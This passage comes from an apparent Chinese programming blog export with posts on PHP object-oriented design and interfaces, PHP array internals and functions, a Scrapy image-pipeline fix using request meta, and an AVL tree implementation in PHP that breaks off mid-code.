<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;1.打开冰箱</span><br><span class="line">function openFridge($fridge)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;打开冰箱:&quot; . $fridge[&#39;name&#39;];</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;2.放置大象</span><br><span class="line">function placeElephant($elephant, $fridge)</span><br><span class="line">&#123;</span><br><span class="line">    if ($elephant[&#39;weight&#39;] &gt; $fridge[&#39;width&#39;]) &#123;</span><br><span class="line">        echo &quot;大象太大了!&quot;;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;把&#123;$elephant[&#39;name&#39;]&#125;放进去:&quot; . $fridge[&#39;name&#39;];</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;3.关上冰箱</span><br><span class="line">function closeFridge($fridge)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;关掉冰箱:&quot; . $fridge[&#39;name&#39;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后实际操作的代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$fridge &#x3D; [</span><br><span class="line">    &#39;name&#39;   &#x3D;&gt; &#39;西门子冰箱&#39;,</span><br><span class="line">    &#39;width&#39;  &#x3D;&gt; 20,</span><br><span class="line">    &#39;height&#39; &#x3D;&gt; 50,</span><br><span class="line">];</span><br><span class="line">$elephant &#x3D; [</span><br><span class="line">    &#39;name&#39;   &#x3D;&gt; &#39;非洲大象&#39;,</span><br><span class="line">    &#39;weight&#39; &#x3D;&gt; 100,</span><br><span class="line">];</span><br><span class="line">&#x2F;&#x2F;三步走</span><br><span class="line">openFridge($fridge);</span><br><span class="line">placeElephant($elephant, $fridge);</span><br><span class="line">closeFridge($fridge);</span><br></pre></td></tr></table></figure>
<p>面向过程编程典型的做法就是定义一大堆函数,一个函数干一件事,然后依次调用各个函数完成一个功能.优点也有,比如简单省事,缺点也很多,比如项目大了之后维护是噩梦!</p>
<h3 id="面向对象方案"><a href="#面向对象方案" class="headerlink" title="面向对象方案:"></a>面向对象方案:</h3><p>首先,得有2个类,一个是大象类:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;大象类</span><br><span class="line">class Elephant</span><br><span class="line">&#123;</span><br><span class="line">    private $name;</span><br><span class="line">    private $weight;</span><br><span class="line">    public function __construct($name, $weight)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name     &#x3D; $name;</span><br><span class="line">        $this-&gt;weight   &#x3D; $weight;</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另一个是冰箱类:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Fridge</span><br><span class="line">&#123;</span><br><span class="line">    private $name;</span><br><span class="line">    private $width;</span><br><span class="line">    public function __construct($name, $width)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name   &#x3D; $name;</span><br><span class="line">        $this-&gt;width  &#x3D; $width;</span><br><span class="line">    &#125;</span><br><span class="line">    public function open()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;打开&#123;$this-&gt;name&#125;冰箱&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function close()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;关闭&#123;$this-&gt;name&#125;冰箱&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function store($something)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;放置&#123;$something&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际操作的时候代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$e &#x3D; new Elephant(&#39;非洲大象&#39;, 12);</span><br><span class="line">$f &#x3D; new Fridge(&#39;西门子冰箱&#39;, 25);</span><br><span class="line">$f-&gt;open();</span><br><span class="line">$e-&gt;store($e);</span><br><span class="line">$f-&gt;close();</span><br></pre></td></tr></table></figure>
<p>当然这里还有一点小疑问,那就是大象放进冰箱这个操作是属于哪个对象?是冰箱的功能,还是大象的功能?换句话说是大象自己走进冰箱,还是大象被放进冰箱呢?很多时候,这2种方案都能实现你所需要的功能,那就得结合实际情况分析了!</p>
<p>换一种思路,假如说,我们定义冰箱有一个功能就是放东西,但是这个东西必须满足一定条件,比如说让对象自己选择采用何种方式放进冰箱等等,这时候我们可以定义一个接口:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">interface Fridgeable</span><br><span class="line">&#123;</span><br><span class="line">    public function intoFridge();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后让需要放进冰箱的对象实现这个接口:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Elephant implements Fridgeable</span><br><span class="line">&#123;</span><br><span class="line">    ....</span><br><span class="line">    &#x2F;&#x2F;实现接口</span><br><span class="line">    public function intoFridge()</span><br><span class="line">    &#123;</span><br><span class="line">         echo &quot;大象飞进了冰箱&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这时候冰箱类就可以这样写:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">public function store(Fridgeable $fridgeable)</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;open();</span><br><span class="line">    $fridgeable-&gt;intoFridge();</span><br><span class="line">    $this-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这时候操作就变成:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$e &#x3D; new Elephant(&#39;非洲大象&#39;, 12);</span><br><span class="line">$f &#x3D; new Fridge(&#39;西门子冰箱&#39;, 25);</span><br><span class="line">$f-&gt;store($e);</span><br></pre></td></tr></table></figure>
<p>假如这时候还有一直兔子也要放进冰箱,我们只需要让这个兔子也实现这个接口即可:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class rabbit implements Fridgeable</span><br><span class="line">&#123;</span><br><span class="line">    ....</span><br><span class="line">    &#x2F;&#x2F;实现接口</span><br><span class="line">    public function intoFridge()</span><br><span class="line">    &#123;</span><br><span class="line">         echo &quot;兔子钻进了冰箱&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而这种设计思想就叫依赖注入,又叫控制反转.冰箱只要定义好一个接口,所有想放进冰箱的对象只要实现这个接口就可以了,这样我们就不用在冰箱里面写一大堆代码,实现了解耦和扩展性!</p>
<p>好啦,就说这么多了,如果不恰当的地方请指正哈!</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>OOP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP数组解析和常见操作</title>
    <url>/2016/coding/php/php-array.html</url>
    <content><![CDATA[<p>在PHP里面使用最多的数据结构恐怕就是数组了，不过PHP的数组和我们传统意义上的数组区别很大，PHP的数组功能上相当于其它语言里面array+list+map数据结构的集合体，这就是动态语言的强大之处。在PHP里面有2种数组，一种是传统的索引数组，另一种是关联数组，其实就是其它语言里面map数据结构。</p>
<h2 id="底层实现"><a href="#底层实现" class="headerlink" title="底层实现"></a>底层实现</h2><p>PHP的数组底层是使用HashTable实现，说到哈希表估计很多人都了解过，PHP数组通过一个映射函数把key映射到对于的value值上面，所以查找起来非常快，时间复杂度是O(1),哈希表都会遇到冲突问题，在PHP里面是通过链表的方式解决的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Bucket：散列表中存储</span></span><br><span class="line">typedef struct _Bucket &#123;</span><br><span class="line">    zval              val;  <span class="comment">//存储的具体value，这里嵌入了一个zval，而不是一个指针</span></span><br><span class="line">    zend_ulong        h;    <span class="comment">//key根据times 33计算得到的哈希值，或者是数值索引编号</span></span><br><span class="line">    zend_string      *key;  <span class="comment">//存储元素的key</span></span><br><span class="line">&#125; Bucket;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//HashTable结构</span></span><br><span class="line">typedef struct _zend_array HashTable;</span><br><span class="line"> </span><br><span class="line">struct _zend_array &#123;</span><br><span class="line">    zend_refcounted_h gc;</span><br><span class="line">    union &#123;</span><br><span class="line">        struct &#123;</span><br><span class="line">            ZEND_ENDIAN_LOHI_4(</span><br><span class="line">                zend_uchar    flags,</span><br><span class="line">                zend_uchar    nApplyCount,</span><br><span class="line">                zend_uchar    nIteratorsCount,</span><br><span class="line">                zend_uchar    reserve)</span><br><span class="line">        &#125; v;</span><br><span class="line">        uint32_t flags;</span><br><span class="line">    &#125; u;</span><br><span class="line">    uint32_t          nTableMask;      <span class="comment">//哈希值计算掩码，等于nTableSize的负值(nTableMask = -nTableSize)</span></span><br><span class="line">    Bucket            *arData;         <span class="comment">//存储元素数组，指向第一个Bucket</span></span><br><span class="line">    uint32_t          nNumUsed;        <span class="comment">//已用Bucket数</span></span><br><span class="line">    uint32_t          nNumOfElements;  <span class="comment">//哈希表有效元素数</span></span><br><span class="line">    uint32_t          nTableSize;      <span class="comment">//哈希表总大小，为2的n次方</span></span><br><span class="line">    uint32_t          nInternalPointer;</span><br><span class="line">    zend_long         nNextFreeElement;  <span class="comment">////下一个可用的数值索引,如:arr[] = 1;arr["a"] = 2;arr[] = 3;则nNextFreeElement = 2;</span></span><br><span class="line">    dtor_func_t       pDestructor;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>PHP7源码里面具体涉及到结构体如上，源码我就不解读了，主要是我也不太熟悉，只是看过一些介绍文章，但是希望大家可以了解一下，下面我主要介绍一下PHP数组的一些常用函数，回顾一下基础。</p>
<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p>PHP的数组函数非常多，但是说起这点我就头疼，PHP的数组函数命名有些非常奇葩，有以<strong>array_</strong>开头的,也有一些不知道根据啥命名的…下面我就分类介绍一下：</p>
<h3 id="1-排序类"><a href="#1-排序类" class="headerlink" title="1.排序类"></a>1.排序类</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 默认排序是按从低到高，而且是引用传递，第二个参数可以选择排序类型</span><br><span class="line">sort ( array &amp;$array [, int $sort_flags &#x3D; SORT_REGULAR ] ) : bool</span><br></pre></td></tr></table></figure>
<p>然后是一些以a、r、k、u组合的函数，不得不说这命名是真烂！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a 是associate，意思是排序是保留索引关联，最常见的是 asort</span><br><span class="line">r 是reverse，意思是逆序排，最常见的就是 rsort</span><br><span class="line">k 是key，意思是按照数组的key进行排序，保留索引关联，主要是用于关联数组，最常见的就是 ksort</span><br><span class="line">u 是user，意思使用用户自定义函数的函数排序，最常见的就是 usort</span><br></pre></td></tr></table></figure>

<p>好了，除了上面这4个之外，其它就是这几个字母的组合的函数了，比如 <strong>arsort</strong> 是保留索引倒序排序、<strong>uksort</strong> 使用用户自定义的比较函数对数组中的键名进行排序，其它我就不多说了。</p>
<h3 id="2-遍历类"><a href="#2-遍历类" class="headerlink" title="2.遍历类"></a>2.遍历类</h3><p>除了可以使用for 和 foreach循环遍历数组之外，PHP还有很多其它遍历数组，并且操作数组的函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;为数组的每个元素应用回调函数</span><br><span class="line">array_map ( callable $callback , array $array1 [, array $... ] ) : array</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;使用用户自定义函数对数组中的每个元素做回调处理</span><br><span class="line"></span><br><span class="line">array_walk ( array &amp;$array , callable $callback [, mixed $userdata &#x3D; NULL ] ) : bool</span><br><span class="line"></span><br><span class="line">array_walk_recursive — 对数组中的每个成员递归地应用用户函数</span><br><span class="line"></span><br><span class="line">array_reduce — 用回调函数迭代地将数组简化为单一的值</span><br><span class="line"></span><br><span class="line">array_replace_recursive — 使用传递的数组递归替换第一个数组的元素</span><br></pre></td></tr></table></figure>
<h3 id="3-其它"><a href="#3-其它" class="headerlink" title="3.其它"></a>3.其它</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array_flip — 交换数组中的键和值</span><br><span class="line">array_reverse — 返回单元顺序相反的数组</span><br><span class="line">array_column — 返回数组中指定的一列</span><br><span class="line">array_combine — 创建一个数组，用一个数组的值作为其键名，另一个数组的值作为其值</span><br><span class="line"></span><br><span class="line">array_diff — 计算数组的差集</span><br><span class="line">array_intersect — 计算数组的交集</span><br><span class="line"></span><br><span class="line">array_filter — 用回调函数过滤数组中的单元</span><br><span class="line">array_flip — 交换数组中的键和值</span><br><span class="line"></span><br><span class="line">array_keys — 返回数组中部分的或所有的键名</span><br><span class="line">array_values — 返回数组中所有的值</span><br><span class="line"></span><br><span class="line">array_rand — 从数组中随机取出一个或多个单元</span><br><span class="line">shuffle — 打乱数组</span><br><span class="line"></span><br><span class="line">array_product — 计算数组中所有值的乘积</span><br><span class="line">array_sum — 对数组中所有值求和</span><br><span class="line"></span><br><span class="line">array_search — 在数组中搜索给定的值，如果成功则返回首个相应的键名</span><br><span class="line">array_key_exists — 检查数组里是否有指定的键名或索引</span><br><span class="line">in_array — 检查数组中是否存在某个值</span><br><span class="line"></span><br><span class="line">array_replace — 使用传递的数组替换第一个数组的元素</span><br><span class="line">array_slice — 从数组中取出一段</span><br><span class="line">array_splice — 去掉数组中的某一部分并用其它值取代</span><br></pre></td></tr></table></figure>

<p>PHP自带的这些数组函数基本上你所想到的操作它都有，没有的也可以组合这些方法创造一个，我记得在laravel框架里面就自带了一个数组集合类，里面就有一些非常好用的方法。</p>
<p>有人问，这么多函数，怎么能记住？</p>
<p>其实我觉得大部分时候并不要死记硬背，面试除外，当你遇到问题的时候至少心里有点数，具体参数可以查下文档，或者使用IDE的联想功能，平时没事多看看官方文档也挺好的。</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title>关于Scrapy爬虫数据传递问题</title>
    <url>/2016/coding/scrapy-param-pass.html</url>
    <content><![CDATA[<h2 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h2><p>这两天研究爬虫掉进一个大坑，爬了好久才爬出去，这里说几句，我写的爬图片的爬虫很简单，从一个图片列表进二级图片详情页，然后爬取二级详情页的所有图片，但是有个需求就是需要以二级详情页的标题为目录分类存放图片！思路很简单，就是在item里面增加一个字段title存放标题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class PicscrapyItem(scrapy.Item):</span><br><span class="line">    image_urls &#x3D; scrapy.Field() # 图片地址</span><br><span class="line">    images &#x3D; scrapy.Field()</span><br><span class="line">    title &#x3D; scrapy.Field() # 图片标题（目录）</span><br></pre></td></tr></table></figure>
<p>然后在pipelines里面获取item里面数据，保存的时候做一下处理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class PicscrapyPipeline(ImagesPipeline):</span><br><span class="line">    item &#x3D; []</span><br><span class="line">    def get_media_requests(self, item, info):</span><br><span class="line">        self.item &#x3D; item</span><br><span class="line">        return [Request(x) for x in item.get(self.images_urls_field, [])]</span><br><span class="line"></span><br><span class="line">    # 重写函数，修改了下载图片名称的生成规则</span><br><span class="line">    def file_path(self, request, response&#x3D;None, info&#x3D;None):</span><br><span class="line">        if not isinstance(request, Request):</span><br><span class="line">            url &#x3D; request</span><br><span class="line">        else:</span><br><span class="line">            url &#x3D; request.url</span><br><span class="line">        url &#x3D; urlparse(url)</span><br><span class="line">        img_name &#x3D; url.path.split(&#39;&#x2F;&#39;)[5].split(&#39;.&#39;)[0]</span><br><span class="line">        return self.item[&#39;title&#39;] + &#39;&#x2F;%s.jpg&#39; % img_name</span><br></pre></td></tr></table></figure>
<p>上面的代码看上去没毛病，重写了Scrapy框架ImagesPipeline的方法,根据title字段分目录存放，但是当我跑起来的时候看上去也没毛病，但是查看数据的时候却不对了，目录是出来了，但是牛头不对马嘴！</p>
<a id="more"></a>

<hr>
<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>研究了好久我才发现问题就在于多线程，Scrapy框架默认是开启多线程的，在settings里面有个字段可以定义开启的线程数，默认是开启16个线程同时爬取：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span><br><span class="line"># CONCURRENT_REQUESTS &#x3D; 32</span><br></pre></td></tr></table></figure>
<p>我上面的代码如果是单线程运行没毛病，但是多线程的话，数据是共享的，就会错乱，导致图片保存的位置根本不是我想要的结果，怎么解决呢？</p>
<h4 id="1-settings"><a href="#1-settings" class="headerlink" title="1. settings"></a>1. settings</h4><p>在settings里面设置线程数为1，釜底抽薪，不过即使这样设置，偶尔也会出现错乱，这种方法牺牲了爬取效率，不可取</p>
<h4 id="2-meta"><a href="#2-meta" class="headerlink" title="2. meta"></a>2. meta</h4><p>我之所以采取类共享的方式传递item是因为在file_path函数内部我无法获取到item的值，后来，网上查了好久发现有一种方式可以在函数间安全传递数据，就是request的meta属性，所以正确的做法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class PicscrapyPipeline(ImagesPipeline):</span><br><span class="line">    def get_media_requests(self, item, info):</span><br><span class="line">        return [Request(x, meta&#x3D;&#123;&#39;title&#39;: item[&#39;title&#39;]&#125;) for x in item.get(self.images_urls_field, [])]</span><br><span class="line"></span><br><span class="line">    # 重写函数，修改了下载图片名称的生成规则</span><br><span class="line">    def file_path(self, request, response&#x3D;None, info&#x3D;None):</span><br><span class="line">        if not isinstance(request, Request):</span><br><span class="line">            url &#x3D; request</span><br><span class="line">        else:</span><br><span class="line">            url &#x3D; request.url</span><br><span class="line">        url &#x3D; urlparse(url)</span><br><span class="line">        img_name &#x3D; url.path.split(&#39;&#x2F;&#39;)[5].split(&#39;.&#39;)[0]</span><br><span class="line">        return request.meta[&#39;title&#39;] + &#39;&#x2F;%s.jpg&#39; % img_name</span><br></pre></td></tr></table></figure>
<p>然后问题解决，新技能get！</p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP平衡二叉树</title>
    <url>/2016/coding/php/php-btree.html</url>
    <content><![CDATA[<h2 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h2><p>之前讲过树，二叉树，二叉排序树，现在说说这个平衡二叉树，平衡二叉树是一个平衡的二叉排序树，关键在于平衡，它的意思是其中每一个节点的左子树和右子树的高度差不多都是1。</p>
<img src = "/images/old/5f6e3e27ly1fvg1sihqxcj20p80es0wr.jpg" />

<p>为什么要平衡呢？还是为了提高查找速度，举个例子有一个数组 [3,2,1,4,5,6,7,10,9,8]，如果按照二叉排序树的算法生成之后应该是图1的结果，这样其实对于查找是不利的，举个例子，如果你要找节点8,<br>你得找7次，但是如果是图2这种结构，则只需要3次。</p>
<a id="more"></a>

<img src = "/images/old/5f6e3e27ly1fvg1zeac9nj20oa0a6tb6.jpg" />

<p>下面看一下图：</p>
<img src = "/images/old/5f6e3e27ly1fvgyvvo4xyj20lf09040f.jpg" />
<img src = "/images/old/5f6e3e27ly1fvgyw55iwlj20ji091gn6.jpg" />
<img src = "/images/old/5f6e3e27ly1fvgyw56ua0j20ob0giq78.jpg" />
<img src = "/images/old/5f6e3e27ly1fvgyw57cblj20pn0jv0x8.jpg" />
<img src = "/images/old/5f6e3e27ly1fvgyw562xgj20o00hcn1w.jpg" />

<p>最后贴一个PHP实现的代码：</p>
<h3 id="树节点类"><a href="#树节点类" class="headerlink" title="树节点类:"></a>树节点类:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $bf; <span class="comment">//平衡因子</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $leftNode;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $rightNode;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($key, $data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key  = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;key . <span class="string">'---&gt;'</span> . <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里涉及到几个算法，比较难理解：</p>
<h3 id="左旋和右旋"><a href="#左旋和右旋" class="headerlink" title="左旋和右旋"></a>左旋和右旋</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对以p为根的二叉排序树作右旋处理</span></span><br><span class="line"><span class="comment"> * 处理之后p指向新的树根节点，即旋转处理之前的左子树的树节点</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $p Node</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">RRotate</span><span class="params">(Node &amp;$p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $l = $p-&gt;leftNode;</span><br><span class="line"></span><br><span class="line">    $p-&gt;leftNode = $l-&gt;rightNode;</span><br><span class="line"></span><br><span class="line">    $l-&gt;rightNode = $p;</span><br><span class="line"></span><br><span class="line">    $p = $l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对以p为根的二叉排序树作左旋处理</span></span><br><span class="line"><span class="comment"> * 处理之后p指向新的树根节点，即旋转处理之前的右子树的树节点</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $p Node</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">LRotate</span><span class="params">(Node &amp;$p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $r = $p-&gt;rightNode;</span><br><span class="line"></span><br><span class="line">    $p-&gt;rightNode = $r-&gt;leftNode;</span><br><span class="line"></span><br><span class="line">    $r-&gt;leftNode = $p;</span><br><span class="line"></span><br><span class="line">    $p = $r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="左平衡旋转和右平衡旋转"><a href="#左平衡旋转和右平衡旋转" class="headerlink" title="左平衡旋转和右平衡旋转"></a>左平衡旋转和右平衡旋转</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 左平衡旋转</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $root Node</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leftBalance</span><span class="params">(Node &amp;$root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $l = $root-&gt;leftNode;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> ($l-&gt;bf) &#123;</span><br><span class="line">        <span class="keyword">case</span> EH:</span><br><span class="line">            $l-&gt;bf    = RH;</span><br><span class="line">            $root-&gt;bf = LH;</span><br><span class="line">            <span class="keyword">self</span>::RRotate($root);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> LH:</span><br><span class="line">            $root-&gt;bf = $l-&gt;bf = EH;</span><br><span class="line">            <span class="keyword">self</span>::RRotate($root);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> RH:</span><br><span class="line">            $lr = $l-&gt;rightNode;</span><br><span class="line">            <span class="keyword">switch</span> ($lr-&gt;bf) &#123;</span><br><span class="line">                <span class="keyword">case</span> LH:</span><br><span class="line">                    $root-&gt;bf = RH;</span><br><span class="line">                    $l-&gt;bf    = EH;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> EH:</span><br><span class="line">                    $root-&gt;bf = $l-&gt;bf = EH;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> RH:</span><br><span class="line">                    $root-&gt;bf = EH;</span><br><span class="line">                    $l-&gt;bf    = LH;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $lr-&gt;bf = EH;</span><br><span class="line">            <span class="keyword">self</span>::LRotate($root-&gt;leftNode);</span><br><span class="line">            <span class="keyword">self</span>::RRotate($root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 右平衡旋转</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $root Node</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rightBalance</span><span class="params">(Node &amp;$root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $r = $root-&gt;rightNode;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> ($r-&gt;bf) &#123;</span><br><span class="line">        <span class="keyword">case</span> RH:</span><br><span class="line">            $root-&gt;bf = $r-&gt;bf = EH;</span><br><span class="line">            <span class="keyword">self</span>::LRotate($root);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EH:</span><br><span class="line">            $root-&gt;bf = RH;</span><br><span class="line">            $r-&gt;bf    = LH;</span><br><span class="line">            <span class="keyword">self</span>::LRotate($root);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> LH:</span><br><span class="line">            $rl = $r-&gt;leftNode;</span><br><span class="line">            <span class="keyword">switch</span> ($rl-&gt;bf) &#123;</span><br><span class="line">                <span class="keyword">case</span> EH:</span><br><span class="line">                    $root-&gt;bf = $r-&gt;bf = EH;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> RH:</span><br><span class="line">                    $root-&gt;bf = LH;</span><br><span class="line">                    $rl-&gt;bf   = EH;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> LH:</span><br><span class="line">                    $root-&gt;bf = EH;</span><br><span class="line">                    $r-&gt;bf    = RH;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $rl-&gt;bf = EH;</span><br><span class="line">            <span class="keyword">self</span>::RRotate($root-&gt;rightNode);</span><br><span class="line">            <span class="keyword">self</span>::LRotate($root);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后是插入算法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insertAvl</span><span class="params">(&amp;$root, int $key, string $data, bool &amp;$taller = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!$root) &#123;</span><br><span class="line">        $root           = <span class="keyword">new</span> Node($key, $data);</span><br><span class="line">        $root-&gt;leftNode = $root-&gt;rightNode = <span class="keyword">null</span>;</span><br><span class="line">        $root-&gt;bf       = EH;</span><br><span class="line">        $taller         = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($key == $root-&gt;key) &#123;</span><br><span class="line">            $taller = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($key &lt; $root-&gt;key) &#123;</span><br><span class="line">            <span class="comment">//在左子树中搜索</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">self</span>::insertAvl($root-&gt;leftNode, $key, $data, $taller)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($taller) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ($root-&gt;bf) &#123; <span class="comment">//检查树的平衡度</span></span><br><span class="line">                    <span class="keyword">case</span> LH:</span><br><span class="line">                        <span class="keyword">self</span>::leftBalance($root);</span><br><span class="line">                        $taller = <span class="keyword">false</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> EH:</span><br><span class="line">                        $root-&gt;bf = LH;</span><br><span class="line">                        $taller   = <span class="keyword">true</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> RH:</span><br><span class="line">                        